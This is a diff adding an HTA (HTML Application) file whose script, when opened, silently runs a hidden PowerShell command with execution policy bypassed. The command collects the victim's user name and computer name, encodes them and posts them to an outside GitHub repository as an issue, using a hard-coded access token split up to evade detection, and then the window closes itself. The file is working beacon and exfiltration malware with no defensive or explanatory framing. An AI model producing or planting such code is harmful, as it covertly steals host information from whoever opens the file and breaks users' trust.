@@ -1,0 +1,12 @@
+<html>
+<head>
+<HTA:APPLICATION ID="Test">
+<script language="jscript">
+	var c = `powershell -ep bypass -noni -w hidden -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-RestMethod -Method Post -Uri 'https://api.github.com/repos/zararli/test/issues' -Body (@{title  =Get-Random; body = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('UserName: $env:UserName,HostName: $env:ComputerName')); labels = @('New')} | ConvertTo-Json) -Headers @{Authorization = 'token ' + 'e668d8 9b66ff56 b221 3d7e6e 5ca7364 595d38db8 '.replace(' ','')} -ContentType 'application/json'"`; 
+	new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</head>
+<body>
+<script>self.close();</script>
+</body>
+</html>
